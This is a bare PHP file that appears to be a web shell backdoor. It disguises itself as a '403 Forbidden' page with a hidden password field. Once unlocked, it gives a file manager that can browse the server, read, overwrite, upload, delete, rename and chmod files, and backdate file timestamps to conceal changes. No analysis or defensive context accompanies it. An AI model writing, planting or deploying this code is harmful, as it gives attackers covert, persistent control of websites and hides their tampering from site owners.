<?php 
session_start();

function _fun1() {
	$__A = array_merge($_GET, $_POST); 
	if(!empty($_SESSION['puid']) || (!empty($__A['x12']) && md5($__A['x12'].md5($__A['x12']))==('5b1f7620cd695107f330c49be8f5a7c6'))) {
		$_SESSION['puid'] = 1;
		_fun2();
	} else {
		exit('<!DOCTYPE html><html><head><title>403 Forbidden.</title></head><body><h1>Forbidden</h1><p>You don\'t have permission to access / on this server.<br /></p><form action="" method="post"><input type="password" name="x12" style="border:0;margin-top:200px"></form></body></html>');
	}
} _fun1();

function _fun2() {
	$Path = dirname(__FILE__);
	$time = time()-8888888;
	$vifiletime = date('Y-m-d H:i:s',$time);
	$data = $_GET;

	$msg = '';
	$lsdir = isset($data['id']) ? $data['id'] : $Path;
	$vifile = isset($data['vid']) ? $data['vid'] : '';
	$rm = isset($data['rm']) ? $data['rm'] : '';
	if (!empty($vifile)) {
	  if (isset($_POST['txt'])) {
		file_put_contents($vifile,$_POST['txt']);
		if (isset($_POST['time'])) touch($vifile,strtotime($_POST['time']));
		$msg = 'ok';
	  }
	  $vifiletxt = '';
	  if(is_file($vifile)) {
		$vifiletxt = file_get_contents($vifile);
		$vifiletime = date('Y-m-d H:i:s',filemtime($vifile));
	  }
	  $lsdir = dirname($vifile);
	} elseif (!empty($_FILES['upf'])) {
	  $upf = $_FILES['upf']; 
	  if(move_uploaded_file($upf['tmp_name'], $lsdir.'/'.$upf['name'])) {
		  chmod($lsdir.'/'.$upf['name'],0755);
		  touch($lsdir.'/'.$upf['name'],$time);
		  $msg = 'upfOK';
	  }
	} elseif (!empty($_FILES['uf'])) {
	  $up_files = $_FILES['uf']; $up_ok = 0;
	  for($I=0;$I<count($up_files['name']);$I++) {
		if(move_uploaded_file($up_files['tmp_name'][$I], $lsdir.'/'.$up_files['name'][$I])) {
		  chmod($lsdir.'/'.$up_files['name'][$I],0755);
		  $up_ok++;
		  if (isset($_POST['time'])) touch($lsdir.'/'.$up_files['name'][$I],strtotime($_POST['time']));
		}
	  }
	  $msg = 'upload = ' . $up_ok;
	} elseif (!empty($rm)) {
	  unlink($rm);
	} elseif (!empty($data['mkd'])) {
	  mkdir($data['mkd']);
	} elseif (!empty($data['rmd'])) {
	  rmdir($data['rmd']);
	} elseif (!empty($data['rna'])&&!empty($data['rnb'])) {
	  rename($data['rna'],$data['rnb']);
	  touch($data['rnb'],$time);
	} elseif (!empty($data['cha'])) {
	  chmod($data['cha'],0755);
	}

    $output = '';
    foreach(glob($lsdir.'/*', GLOB_ONLYDIR) as $v) {
      $output .= '<div class="list dir"><span>'.preg_replace('/.*\//','',$v).'</span><i>'.date('Y-m-d H:i:s',filemtime($v)).'</i><u>'.filesize($v).'</u><b>'.substr(sprintf("%o",fileperms($v)),-4).'</b><a href="?id='.$v.'">open</a></div>';
    }
    foreach(glob($lsdir.'/{*,.*,*.}', GLOB_BRACE) as $v) {
      if(is_file($v)) $output .= '<div class="list file"><span>'.preg_replace('/.*\//','',$v).'</span><i>'.date('Y-m-d H:i:s',filemtime($v)).'</i><u>'.filesize($v).'</u><b>'.substr(sprintf("%o",fileperms($v)),-4).'</b><a href="?vid='.$v.'">edit</a> = <a href="?rm='.$v.'" onclick="return confirm(\'DEL\')">del</a></div>';
    }

	echo '<!DOCTYPE html><html><head><title>myAdmin</title><style>*{vertical-align:middle;margin:0;padding:0;font:14px/18px tahoma;}.l{float:left;}.r{float:right;}header{height:30px;background:#000;color:#fff;padding:5px}header a{color:#fff;margin:3px}header form{display:inline-block;margin-right:5px;padding-right:5px}input{padding:3px;width:120px;font-size:12px;background:#fff;outline:0;}button{height:26px;width:30px;cursor:pointer;}textarea{padding:5px;width:90%;margin-top:5px}.msg{color:red}.dir{color:green;}#edit{padding:0 10px 10px}.list{line-height:20px;}.list:hover{background:#eee;}.list *{display:inline-block;text-align:left;width:100px;font-style:normal}.list span,.list i{width:200px;}.list a{display:inline;color:red}#output{padding:10px}</style></head><body><header><div class="l"><form method="get" action=""><input type="text" name="id" value="'.$lsdir.'" style="width:200px"><button type="submit">id</button></form><form method="post" enctype="multipart/form-data" action=""><input type="file" name="uf[]" multiple style="width:20px"><button type="submit">up</button><input type="text" name="time" value="'.$vifiletime.'" class="i"></form><form method="get" action=""><input type="text" name="vid" value="'.$lsdir.'/" style="width:200px"><button type="submit">vid</button></form></div><span><a href="?id='.$Path.'">PATH</a> <a href="?id='.$_SERVER['DOCUMENT_ROOT'].'">WWW</a></span><span class="msg">'.$msg.'</span></header>'.(isset($vifiletxt)?'<div id="edit"><form method="post" action=""><input type="text" name="time" value="'.$vifiletime.'" class="i"><button type="submit">Save</button><br><textarea name="txt" rows="40">'.$vifiletxt.'</textarea></form></div>':'<div id="output">'.$output.'</div>').'</body></html>';
	exit;
}
?>